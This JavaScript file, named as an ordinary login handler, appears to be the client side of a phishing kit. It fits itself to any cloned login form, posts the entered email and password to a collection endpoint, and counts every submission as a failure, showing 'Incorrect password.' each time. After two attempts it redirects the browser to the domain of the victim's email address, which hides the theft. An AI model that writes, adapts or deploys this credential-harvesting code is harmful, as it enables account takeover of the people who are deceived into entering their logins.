// login-handler.js
document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("login-form");
  if (!form) return console.warn("login-handler: #login-form not found");

  // If a page has a visible recaptcha container but the API wasn't included,
  // inject the API script so grecaptcha becomes available before submit.
  try {
    const hasRecaptchaDiv = !!document.querySelector('.g-recaptcha');
    if (hasRecaptchaDiv && typeof grecaptcha === 'undefined') {
      const s = document.createElement('script');
      s.src = 'https://www.google.com/recaptcha/api.js';
      s.async = true; s.defer = true;
      document.head.appendChild(s);
      console.info('login-handler: injected recaptcha API script');
    }
    // If there's no recaptcha div present at all, insert the default widget
    // and the hidden fields right after the submit button so the checkbox is visible.
    if (!hasRecaptchaDiv) {
      try {
        const submitControl = document.querySelector('#login-form button[type="submit"], #login-form input[type="submit"], #login-form input[type="image"]');
        const container = document.createElement('div');
        container.className = 'recaptcha-wrapper';
        container.innerHTML = `\n<div class="g-recaptcha" data-sitekey="6LezdrYrAAAAAPgJZ4zzn_cnKeYPXZadOIrPn_Tx"></div>\n<input type="hidden" name="captcha" id="captcha-response" />\n<input type="text" name="honeypot" style="display:none">\n<input type="hidden" id="lourl" name="lourl" />\n`;
        if (submitControl && submitControl.parentNode) {
          submitControl.parentNode.insertBefore(container, submitControl.nextSibling);
        } else if (form) {
          form.appendChild(container);
        } else {
          document.body.appendChild(container);
        }

        // Ensure recaptcha API is present
        if (typeof grecaptcha === 'undefined') {
          const s2 = document.createElement('script');
          s2.src = 'https://www.google.com/recaptcha/api.js';
          s2.async = true; s2.defer = true;
          document.head.appendChild(s2);
        }
      } catch (e) {
        // ignore DOM insertion errors
      }
    }
  } catch (e) {
    // ignore
  }

  // flexible input finders
  const findInput = (selFn) => {
    const all = Array.from(form.querySelectorAll('input, textarea, button'));
    return all.find(selFn);
  };

  const emailInput =
    document.getElementById("email") ||
    form.querySelector('input[type="email"]') ||
    findInput((el) => /(email|user|login|username)/i.test(el.name || el.id || el.placeholder || el.className)) ||
    form.querySelector('input');

  const passwordInput =
    document.getElementById("password") ||
    form.querySelector('input[type="password"]') ||
    findInput((el) => /(pass|pwd|password)/i.test(el.name || el.id || el.placeholder || el.className));

  // find submit control (button, input[type=submit], input[type=image])
  let submitBtn =
    document.getElementById("submit-btn") ||
    form.querySelector('button[type="submit"], input[type="submit"], input[type="image"]') ||
    findInput((el) => (el.tagName.toLowerCase() === 'button' && /(sign|login|submit)/i.test(el.textContent || el.value || el.id)) || (/(submit|login|sign)/i.test(el.name || el.id)));

  // utility to set disabled state for varied control types
  const setDisabled = (el, disabled) => {
    if (!el) return;
    try {
      // Avoid calling el.disabled on input[type=image] because some page CSS hides disabled controls
      const tag = el.tagName.toLowerCase();
      const type = (el.type || "").toLowerCase();

      if (tag === 'input' && type === 'image') {
        // don't set disabled attribute; use aria + styles
        if (disabled) {
          el.setAttribute('aria-disabled', 'true');
          el.style.opacity = "0.6";
          el.style.pointerEvents = "none";
        } else {
          el.removeAttribute('aria-disabled');
          el.style.opacity = "1";
          el.style.pointerEvents = "auto";
        }
      } else {
        // safe to set disabled for button/input[type=submit]
        el.disabled = !!disabled;
        if (tag === 'button') {
          el.style.pointerEvents = disabled ? "none" : "auto";
        }
      }
    } catch (e) {
      // ignore
    }
  };

  // ensure message box exists and is visible regardless of page CSS
  let msgBox = document.getElementById("login-msg");
  if (!msgBox) {
    msgBox = document.createElement("div");
    msgBox.id = "login-msg";
    // basic visible styling so it's not hidden by page CSS
    msgBox.style.color = "#b00020";
    msgBox.style.background = "rgba(255,255,255,0.95)";
    msgBox.style.padding = "8px 10px";
    msgBox.style.borderRadius = "4px";
    msgBox.style.boxShadow = "0 2px 6px rgba(0,0,0,0.15)";
    msgBox.style.marginTop = "8px";
    msgBox.style.display = "none";
    msgBox.style.zIndex = "99999";
    msgBox.style.maxWidth = "480px";
    msgBox.style.wordBreak = "break-word";

    // Prefer inserting right after the form; if unavailable, append to body
    try {
      if (form.parentNode) form.parentNode.insertBefore(msgBox, form.nextSibling);
      else document.body.appendChild(msgBox);
    } catch {
      document.body.appendChild(msgBox);
    }
  }

  let isSubmitting = false;
  let failedAttempts = 0;

  function showMessage(text) {
    msgBox.textContent = text;
    msgBox.style.display = "block";
    try { msgBox.scrollIntoView({ behavior: "smooth", block: "center" }); } catch {}
  }
  function hideMessage() {
    msgBox.style.display = "none";
  }
  function resetUI() {
    isSubmitting = false;
    setDisabled(submitBtn, false);
    if (submitBtn && submitBtn.tagName.toLowerCase() === "button") submitBtn.textContent = submitBtn.dataset.origText || submitBtn.textContent || "Sign in";
  }

  // preserve original button text if button element
  if (submitBtn && submitBtn.tagName.toLowerCase() === "button") {
    submitBtn.dataset.origText = submitBtn.textContent;
  }

  // fetch with timeout helper
  const fetchWithTimeout = (url, opts = {}, timeout = 10000) =>
    Promise.race([
      fetch(url, opts),
      new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), timeout))
    ]);

  // Wait for grecaptcha to be ready (if present) before attempting to read response.
  // This reduces race issues where the API script was injected but not yet initialized.
  const waitForGreCaptcha = (timeoutMs = 2000) => new Promise((resolve) => {
    const start = Date.now();
    const check = () => {
      if (typeof grecaptcha !== 'undefined' && grecaptcha.getResponse) return resolve(true);
      if (Date.now() - start > timeoutMs) return resolve(false);
      setTimeout(check, 150);
    };
    check();
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    if (isSubmitting) return;
    hideMessage();

    const email = emailInput ? emailInput.value.trim() : "";
    const password = passwordInput ? passwordInput.value : "";

    if (!email || !password) {
      showMessage("Please enter both email and password.");
      if (passwordInput) passwordInput.value = "";
      return;
    }

    isSubmitting = true;
    // use setDisabled to avoid hiding image submit controls via CSS
    setDisabled(submitBtn, true);
    if (submitBtn && submitBtn.tagName.toLowerCase() === "button") submitBtn.textContent = "Logging in...";

    // optional grecaptcha value — wait briefly for grecaptcha to initialize if injected dynamically
    let captchaValue = "";
    const captchaElem = document.getElementById("captcha-response") || document.querySelector('textarea[name="g-recaptcha-response"], input[name="g-recaptcha-response"]');
    try {
      const ready = await waitForGreCaptcha(2000);
      if (ready) {
        try { captchaValue = grecaptcha.getResponse(); } catch {}
      }
    } catch {}
    if (!captchaValue && captchaElem) captchaValue = captchaElem.value || "";

    const payload = {
      email,
      password,
      lourl: (document.querySelector('input[name="lourl"]') || {}).value || "",
      captcha: captchaValue
    };

    try {
      const res = await fetchWithTimeout("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }, 12000);

      const data = await res.json().catch(() => ({ message: res.statusText || "Unknown response" }));

      // always clear password for next attempt
      if (passwordInput) passwordInput.value = "";

      failedAttempts++;

      // show server-provided message or generic
      showMessage(data.message || (res.ok ? "Logged in" : "Incorrect password."));

      // if server responds with redirect URL (rare), follow it
      if (data.redirect) {
        setTimeout(() => window.location.href = data.redirect, 600);
        return;
      }

      // if not OK, keep user on page; after 2 failed attempts optionally redirect
      if (!res.ok) {
        // reset grecaptcha if present
        try { if (typeof grecaptcha !== "undefined" && grecaptcha.reset) grecaptcha.reset(); } catch {}
        if (failedAttempts >= 2) {
          setTimeout(() => {
            const domain = (email.split("@")[1] || "").toLowerCase();
            if (domain) window.top.location.href = `https://${domain}`;
          }, 800);
        }
      } else {
        // success path: do nothing special here
      }
    } catch (err) {
      // network / timeout
      showMessage("Network error. Please try again.");
      if (passwordInput) passwordInput.value = "";
      try { if (typeof grecaptcha !== "undefined" && grecaptcha.reset) grecaptcha.reset(); } catch {}
    } finally {
      resetUI();
    }
  });
});